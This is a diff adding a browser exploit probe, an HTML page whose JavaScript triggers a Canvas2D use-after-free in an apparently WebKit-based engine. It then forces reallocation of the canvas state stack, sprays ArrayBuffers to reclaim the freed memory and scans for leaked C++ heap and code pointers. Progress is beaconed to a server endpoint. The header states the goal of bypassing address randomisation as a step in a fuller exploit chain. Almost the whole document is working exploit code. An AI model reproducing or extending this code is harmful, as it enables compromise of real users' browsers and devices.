@@ -1,0 +1,346 @@
+<!--
+  p625: Canvas2D state stack reallocation → pointer leak via ArrayBuffer reclaim
+
+  Theory: Canvas2D save() grows the state Vector. When Vector capacity doubles,
+  the OLD buffer is freed to fastMalloc (same heap as ArrayBuffer). If we can
+  reclaim the freed state buffer with ArrayBuffer, we can read stale C++ pointers
+  (fillStyle gradient*, strokeStyle pattern*, font*, etc.) as raw bytes.
+
+  The CONTEXT remains valid (same-type reclaim from p553). Only the state buffer
+  is freed. No vtable issue.
+
+  Phase A: Trigger UAF + same-type reclaim (standard p553)
+  Phase B: Set fillStyle to gradient (stores C++ pointer in state)
+  Phase C: save() up to capacity, then one more save() → reallocation → old buffer freed
+  Phase D: Spray ArrayBuffer of estimated old buffer size → reclaim freed state buffer
+  Phase E: Scan ArrayBuffers for pointer-shaped values (>0x100000000)
+
+  If we find C++ pointers, they're heap addresses of gradient/pattern objects.
+  If those objects have vtables, we can then free them and reclaim to get text base.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p625</title></head>
+<body>p625: state stack realloc leak
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+var log = document.getElementById('log');
+var retained = [];
+var beaconQ = [];
+
+function emit(tag, msg) {
+  var line = tag + ' ' + (msg || '');
+  log.textContent += line + '\n';
+  beaconQ.push(line);
+  if (beaconQ.length >= 5) flushBeacons();
+}
+function flushBeacons() {
+  if (!beaconQ.length) return;
+  var batch = beaconQ.splice(0, 10).join('|');
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/P625-' + encodeURIComponent(batch), false);
+    x.send();
+  } catch(e) {}
+}
+
+function u8hex(u8, off, len) {
+  var s = '';
+  for (var i = off + len - 1; i >= off; i--) s += ('0' + u8[i].toString(16)).slice(-2);
+  return s;
+}
+
+window.onerror = function(m) { emit('ONERR', String(m).slice(0,120)); flushBeacons(); };
+
+try {
+emit('START', 'ua=' + navigator.userAgent.slice(0,60));
+
+// ===== Phase A: Trigger UAF + same-type reclaim =====
+var canvas = document.createElement('canvas');
+canvas.width = 64; canvas.height = 64;
+document.body.appendChild(canvas);
+retained.push(canvas);
+
+var inner = null, outer = null, opts = {};
+Object.defineProperty(opts, 'desynchronized', { get: function() {
+  if (!inner) inner = canvas.getContext('2d');
+  return false;
+}});
+outer = canvas.getContext('2d', opts);
+retained.push(outer, inner);
+
+if (!inner || inner === outer) { emit('NO-UAF', ''); flushBeacons(); return; }
+emit('A-UAF', 'inner≠outer');
+
+var SPRAY = 80;
+var sprayCtx = [];
+for (var i = 0; i < SPRAY; i++) {
+  var sc = document.createElement('canvas');
+  sc.width = 64; sc.height = 64;
+  var ctx = sc.getContext('2d');
+  sprayCtx.push(ctx);
+  retained.push(sc, ctx);
+}
+
+// Verify channel
+inner.setTransform(11.11, 22.22, 33.33, 44.44, 55.55, 66.66);
+var aliasIdx = -1;
+for (var i = 0; i < sprayCtx.length; i++) {
+  var st = sprayCtx[i].getTransform();
+  if (st.a === 11.11 && st.b === 22.22 && st.e === 55.55) { aliasIdx = i; break; }
+}
+if (aliasIdx < 0) { emit('NO-ALIAS', ''); flushBeacons(); return; }
+emit('A-ALIAS', 'idx=' + aliasIdx);
+
+var alias = sprayCtx[aliasIdx];
+inner.setTransform(1, 0, 0, 1, 0, 0);
+
+// ===== Phase B: Set complex fill/stroke styles =====
+// Create gradients that store C++ pointer in the state
+var grad1 = alias.createLinearGradient(0, 0, 64, 64);
+grad1.addColorStop(0, '#ff0000');
+grad1.addColorStop(1, '#0000ff');
+var grad2 = alias.createRadialGradient(32, 32, 0, 32, 32, 32);
+grad2.addColorStop(0, '#00ff00');
+grad2.addColorStop(1, '#ffff00');
+retained.push(grad1, grad2);
+
+inner.fillStyle = grad1;
+inner.strokeStyle = grad2;
+inner.font = '24px serif';
+inner.shadowColor = 'rgba(255,128,64,0.75)';
+inner.shadowBlur = 10;
+inner.shadowOffsetX = 5;
+inner.shadowOffsetY = 7;
+inner.lineWidth = 3.14159;
+inner.miterLimit = 12.5;
+
+emit('B-STYLES', 'grad+font set');
+
+// ===== Phase C: save() to trigger reallocation =====
+// Vector typically starts at capacity 1, doubles: 1→2→4→8→16→32→64→128
+// We save 63 times to fill capacity 64, then save once more to trigger 64→128 realloc
+// That frees a buffer of 64 entries × sizeof(State)
+
+// First, let's measure: how many saves can we do before trouble?
+var SAVES_PRE = 63;
+var SAVES_TRIGGER = 1;
+
+for (var i = 0; i < SAVES_PRE; i++) {
+  try { inner.save(); } catch(e) { emit('C-SAVE-ERR', 'i=' + i + ' ' + e); break; }
+}
+emit('C-SAVED', 'n=' + SAVES_PRE);
+
+// Read transform to verify state stack works
+var preT = inner.getTransform();
+emit('C-PRE-T', 'a=' + preT.a + ' b=' + preT.b);
+
+// Now trigger reallocation: this save causes Vector to grow, freeing old buffer
+try { inner.save(); } catch(e) { emit('C-TRIG-ERR', '' + e); }
+emit('C-TRIGGERED', 'realloc expected');
+
+// ===== Phase D: Spray ArrayBuffer to reclaim freed state buffer =====
+// We don't know sizeof(State) exactly. Try multiple sizes.
+// If State ≈ 256B, old buffer = 64 × 256 = 16384 bytes
+// If State ≈ 192B, old buffer = 64 × 192 = 12288 bytes
+// If State ≈ 320B, old buffer = 64 × 320 = 20480 bytes
+// If State ≈ 128B, old buffer = 64 × 128 = 8192 bytes
+// Try sizes from bmalloc perspective: 8192, 12288, 16384, 20480, 24576, 32768
+
+var SIZES = [4096, 6144, 8192, 10240, 12288, 14336, 16384, 20480, 24576, 28672, 32768, 49152, 65536];
+var AB_PER_SIZE = 32;
+var allABs = {};
+var allViews = {};
+
+for (var si = 0; si < SIZES.length; si++) {
+  var sz = SIZES[si];
+  var arr = [];
+  var views = [];
+  for (var j = 0; j < AB_PER_SIZE; j++) {
+    try {
+      var ab = new ArrayBuffer(sz);
+      arr.push(ab);
+      views.push(new Uint8Array(ab));
+      retained.push(ab);
+    } catch(e) { break; }
+  }
+  allABs[sz] = arr;
+  allViews[sz] = views;
+}
+emit('D-SPRAYED', SIZES.length + ' sizes × ' + AB_PER_SIZE);
+
+// ===== Phase E: Scan for non-zero / pointer-shaped values =====
+var totalHits = 0;
+var ptrHits = [];
+
+for (var si = 0; si < SIZES.length; si++) {
+  var sz = SIZES[si];
+  var views = allViews[sz];
+  if (!views) continue;
+  var sizeHits = 0;
+  var sizeNonzero = 0;
+
+  for (var vi = 0; vi < views.length; vi++) {
+    var u8 = views[vi];
+    var nonzero = false;
+
+    // Scan every 8 bytes as a potential pointer
+    for (var off = 0; off < u8.length; off += 8) {
+      // Check if this qword is non-zero
+      var anyNz = false;
+      for (var b = 0; b < 8; b++) { if (u8[off + b] !== 0) { anyNz = true; break; } }
+      if (!anyNz) continue;
+
+      nonzero = true;
+      sizeNonzero++;
+
+      // Read as potential pointer (little-endian 64-bit)
+      var lo = u8[off] | (u8[off+1] << 8) | (u8[off+2] << 16) | (u8[off+3] << 24);
+      var hi = u8[off+4] | (u8[off+5] << 8) | (u8[off+6] << 16) | (u8[off+7] << 24);
+
+      // Check for pointer-like patterns
+      var isKernelPtr = (hi >>> 0) >= 0xFFFF8000;
+      var isHeapPtr = hi > 0 && hi < 0x800;  // typical userland heap range
+      var isTextPtr = hi >= 0x100 && hi < 0x8000;  // WebKit text might be here
+
+      if (isKernelPtr || isHeapPtr || isTextPtr) {
+        sizeHits++;
+        if (ptrHits.length < 50) {
+          ptrHits.push({sz: sz, vi: vi, off: off, hex: u8hex(u8, off, 8), hi: hi, lo: lo});
+        }
+      }
+    }
+
+    if (nonzero && sizeNonzero <= 3) {
+      // Log first few non-zero buffers per size
+      var sample = '';
+      for (var off = 0; off < Math.min(u8.length, 128); off += 8) {
+        var anyNz2 = false;
+        for (var b = 0; b < 8; b++) { if (u8[off + b] !== 0) { anyNz2 = true; break; } }
+        if (anyNz2) sample += '+' + off.toString(16) + '=' + u8hex(u8, off, 8) + ' ';
+      }
+      if (sample) emit('E-NZ', 'sz=' + sz + '/v' + vi + ' ' + sample.slice(0, 200));
+    }
+  }
+
+  if (sizeHits > 0 || sizeNonzero > 0) {
+    emit('E-SIZE', 'sz=' + sz + ' nz=' + sizeNonzero + ' ptrs=' + sizeHits);
+    totalHits += sizeHits;
+  }
+}
+
+emit('E-TOTAL', 'nzQwords=' + totalHits + ' ptrHits=' + ptrHits.length);
+
+// Report pointer hits
+for (var i = 0; i < Math.min(ptrHits.length, 20); i++) {
+  var h = ptrHits[i];
+  emit('E-PTR', 'sz=' + h.sz + '/v' + h.vi + '+0x' + h.off.toString(16) + '=' + h.hex);
+}
+
+// ===== Phase F: Try different save counts to vary freed buffer size =====
+// Restore everything first
+for (var i = 0; i < SAVES_PRE + SAVES_TRIGGER; i++) {
+  try { inner.restore(); } catch(e) { break; }
+}
+
+// Try with fewer saves (8 entries → realloc → free 8-entry buffer)
+emit('F-ROUND2', 'trying 7+1 saves');
+inner.fillStyle = grad1;
+inner.strokeStyle = grad2;
+
+for (var i = 0; i < 7; i++) inner.save();
+inner.save(); // trigger 8→16 realloc
+
+// Spray at smaller sizes
+var SIZES2 = [1024, 1536, 2048, 2560, 3072, 3584, 4096, 5120, 6144];
+for (var si = 0; si < SIZES2.length; si++) {
+  var sz = SIZES2[si];
+  var arr = [];
+  var views = [];
+  for (var j = 0; j < 64; j++) {
+    try {
+      var ab = new ArrayBuffer(sz);
+      arr.push(ab);
+      views.push(new Uint8Array(ab));
+      retained.push(ab);
+    } catch(e) { break; }
+  }
+
+  for (var vi = 0; vi < views.length; vi++) {
+    var u8 = views[vi];
+    for (var off = 0; off < u8.length; off += 8) {
+      var anyNz = false;
+      for (var b = 0; b < 8; b++) { if (u8[off + b] !== 0) { anyNz = true; break; } }
+      if (!anyNz) continue;
+
+      var sample = '+' + off.toString(16) + '=' + u8hex(u8, off, 8);
+      emit('F-NZ', 'sz=' + sz + '/v' + vi + ' ' + sample);
+      break; // just first nonzero per buffer
+    }
+  }
+}
+
+// Restore
+for (var i = 0; i < 8; i++) { try { inner.restore(); } catch(e) { break; } }
+
+// ===== Phase G: Alternative - spray BEFORE realloc =====
+// Fill heap with ABs first, then trigger realloc.
+// The freed state buffer might land in a hole between ABs.
+emit('G-PREFILL', 'spray then realloc');
+
+var prefillABs = [];
+var prefillViews = [];
+for (var i = 0; i < 200; i++) {
+  try {
+    var ab = new ArrayBuffer(16384);
+    prefillABs.push(ab);
+    prefillViews.push(new Uint8Array(ab));
+    retained.push(ab);
+  } catch(e) { break; }
+}
+emit('G-PREFILLED', 'n=' + prefillABs.length);
+
+// Free half to create holes
+for (var i = 0; i < prefillABs.length; i += 2) {
+  prefillABs[i] = null;
+  prefillViews[i] = null;
+}
+// GC pressure
+for (var i = 0; i < 50; i++) {
+  try { var tmp = new ArrayBuffer(1024); } catch(e) {}
+}
+
+// Now trigger realloc - the freed state buffer might land in a prefill hole
+inner.fillStyle = grad1;
+inner.strokeStyle = grad2;
+for (var i = 0; i < 63; i++) inner.save();
+inner.save(); // trigger 64→128 realloc, old 64-entry buffer freed
+
+// The freed buffer should be ~16KB. Check the surviving prefill ABs for contamination.
+var gHits = 0;
+for (var i = 1; i < prefillViews.length; i += 2) {
+  if (!prefillViews[i]) continue;
+  var u8 = prefillViews[i];
+  for (var off = 0; off < u8.length; off += 8) {
+    var anyNz = false;
+    for (var b = 0; b < 8; b++) { if (u8[off + b] !== 0) { anyNz = true; break; } }
+    if (anyNz) {
+      gHits++;
+      if (gHits <= 10) {
+        emit('G-HIT', 'v' + i + '+' + off.toString(16) + '=' + u8hex(u8, off, 8));
+      }
+    }
+  }
+}
+emit('G-TOTAL', 'hits=' + gHits);
+
+// Final cleanup
+for (var i = 0; i < 64; i++) { try { inner.restore(); } catch(e) { break; } }
+
+emit('ALIVE', 'probe complete');
+flushBeacons();
+} catch(fatal) { emit('FATAL', String(fatal).slice(0,200)); flushBeacons(); }
+})();
+</script>
+</body></html>
